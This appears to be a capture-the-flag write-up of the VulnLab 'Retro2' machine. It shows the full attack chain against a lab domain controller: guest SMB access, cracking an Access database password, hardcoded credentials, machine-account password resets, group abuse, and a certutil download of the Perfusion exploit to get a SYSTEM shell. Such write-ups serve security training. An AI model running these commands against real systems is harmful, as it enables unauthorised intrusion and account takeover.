---
title: Retro2
date: 2026-02-16T00:00:00
draft: false
sources: "VulnLab"
difficulties: Easy
tags: ["Windows", "Active Directory", "SMB Enumeration", "Guest Access", "BloodHound", "Computer Accounts", "RpcEptMapper"]
author: Anx
description: Retro2 is a Windows AD challenge involving guest SMB access to an MS Access database, LDAP credential recovery from VBA, and lateral movement via machine account abuse, concluding with a privilege escalation to SYSTEM through RpcEptMapper.
---

![](featured.png)

## Enumeration
### Nmap

First, a full TCP port scan was performed against the target:

```
sudo nmap -p- -sCV 10.10.127.218 -oA nmap/10.10.127.218-full-tcp

Nmap scan report for 10.10.127.218
Host is up (0.052s latency).
Not shown: 65521 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-02-15 12:37:41Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49172/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-15T12:38:30
|_  start_date: 2026-02-15T12:08:27
|_clock-skew: mean: -19m59s, deviation: 34m36s, median: -1s
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: BLN01
|   NetBIOS computer name: BLN01\x00
|   Domain name: retro2.vl
|   Forest name: retro2.vl
|   FQDN: BLN01.retro2.vl
|_  System time: 2026-02-15T13:38:33+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

```

The scan results identified the host as a Windows Server 2008 R2 Datacenter SP1 Domain Controller named `BLN01.retro2.vl`.

Key exposed services included:
- Kerberos (88)
- LDAP (389)
- SMB (445)
- RPC services
- kpasswd (464)

The SMB OS discovery script confirmed:
- Hostname: BLN01
- Domain: retro2.vl
- OS: Windows Server 2008 R2 Datacenter SP1

### SMB

SMB shares were enumerated using guest access:

```bash
nxc smb 10.10.127.218 -u 'Guest' -p '' --shares
```

![](Pasted%20image%2020260216112103.png)

A share named `Public` was accessible with read permissions.

## FootHold

Inside the share, a Microsoft Access database file (staff.accdb) was identified and downloaded for offline analysis.

```bash
smbclient //10.10.127.218/Public -U "Guest"
```

![](Pasted%20image%2020260216112153.png)

### Cracking the Access Database

The database file was password-protected.

![](Pasted%20image%2020260215154847.png)

The password hash was extracted and then a dictionary attack was performed using John the Ripper::

```bash
office2john staff.accdb > accdbfile.hash

john --wordlist=/usr/share/wordlists/rockyou.txt accdbfile.hash
```

![](Pasted%20image%2020260215150528.png)

![](Pasted%20image%2020260215154918.png)

After successfully cracking the password, the database was opened and hardcoded domain credentials were found embedded on a VBA macro.

![](Pasted%20image%2020260215155038.png)

### LDAP and BloodHound Enumeration

The recovered credentials were validated:

```bash
nxc smb 10.10.127.218 -u 'ldapreader' -p '<password>' --shares
```

![](Pasted%20image%2020260216112748.png)

Since the credentials were valid, Active Directory data was collected for further analysis using BloodHound.

```bash
nxc ldap 10.10.127.218 -d retro2.vl -u 'ldapreader' -p '<password>' --bloodhound --dns-server 10.10.127.218 -c All
```

![](Pasted%20image%2020260216112914.png)

The analysis revealed three domain computer accounts.

![](Pasted%20image%2020260215233338.png)

It was identified that the machine account `FS01$` had ForceChangePassword rights over `ADMWS01$`.

This permission is critical because it allows resetting the target account’s password without knowledge of the current password. If access to one of the FS0X machine accounts is obtained, full control over the target machine account becomes possible.

Both `FS0X` machine accounts were configured with their machine names as passwords, which allowed authentication using:

```bash
nxc smb 10.10.127.218 -d retro2.vl -u 'fs01$' -p 'fs01'
```

![](Pasted%20image%2020260215234748.png)

> [!NOTE]
> Before continuing with the exploitation, the following line was added to the /etc/host file.
> ```
> 10.10.127.218   retro2.vl BLN01.retro2.vl
> ```

The credentials were valid; however, since the account had not been used for a long time, the machine password was out of sync with the domain controller. This is typical of pre-created computer accounts. 

To resolve this, the password for `FS01$` was reset:

```bash
impacket-changepasswd 'retro2.vl/fs01$':'fs01'@retro2.vl -newpass Pa55w0rd -dc-ip BLN01.retro2.vl -p rpc-samr
```

![](Pasted%20image%2020260216123826.png)

After resetting the password, the FS01$ account was marked as Owned in BloodHound.
Using the “Shortest Paths from Owned Objects” query, it was identified that:

- `FS01$` had ForceChangePassword rights over `ADMWS01$`.
- `ADMWS01$` had AddSelf privileges on the Services group.
- The Services group was a member of the Remote Desktop Users group.


![](Pasted%20image%2020260216114404.png)

Using the identified privileges, the password for `ADMWS01$` was reset using:

```bash
net rpc password 'ADMWS01$' Pa55w0rd -U retro2.vl/'fs01$' -S BLN01.retro2.vl
```

![](Pasted%20image%2020260216124005.png)

And then, using the newly compromised ADMWS01$ account, the ldapreader user was added to the Services group::

```bash
net rpc group addmem "Services" "ldapreader" -S BLN01.retro2.vl -U retro2.vl/'ADMWS01$'

# OR WITH BloodyAD
bloodyAD --host BLN01.retro2.vl -d retro2.vl -u 'ADMWS01$' -p 'Rogue1' add groupMember 'SERVICES' 'ldapreader'
```

![](Pasted%20image%2020260216133532.png)

Group membership was verified using:

```
ldapsearch -x -H ldap://10.10.127.218 \
-D "ldapreader" -w "ppYaVcB5R" \       
-b "CN=Services,CN=Users,DC=retro2,DC=vl" \   
"(objectClass=group)" member
```

![](Pasted%20image%2020260216134207.png)

At this stage, the ldapreader user had effective membership in the Remote Desktop Users group.

RDP access to the server was established using Remmina. The TLS security level had to be set to 0; otherwise, the connection would fail.

![](Pasted%20image%2020260216134959.png)

![](Pasted%20image%2020260216134940.png)

![](Pasted%20image%2020260216135034.png)

## Privilege escalation

The host was running Windows Server 2008 R2, which is vulnerable to a privilege escalation vulnerability involving improper permissions on the RpcEptMapper registry key, as described in the following blog:

- [Windows Registry RpcEptMapper EoP research by itm4n](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
- https://github.com/itm4n/Perfusion

This vulnerability enables privilege escalation to **NT AUTHORITY\SYSTEM** by:
- Manipulating the `RpcEptMapper` registry key
- Triggering controlled DLL loading behavior

First, the github repository was downloaded and opened in Visual Studio.

> [!NOTE]
> If using a Visual Studio version newer than 2019, additional packages must be installed to successfully build the project.

![](Pasted%20image%2020260216153804.png)

The project was compiled, producing Perfusion.exe.

![](Pasted%20image%2020260216154825.png)

And finally the binary was uploaded to the target and executed to spawn a SYSTEM shell session:

```bash
certutil.exe -urlcache -f http://10.8.8.46/Perfusion.exe Perfusion.exe
.\Perfusion.exe -c cmd -i
```

![](Pasted%20image%2020260216155459.png)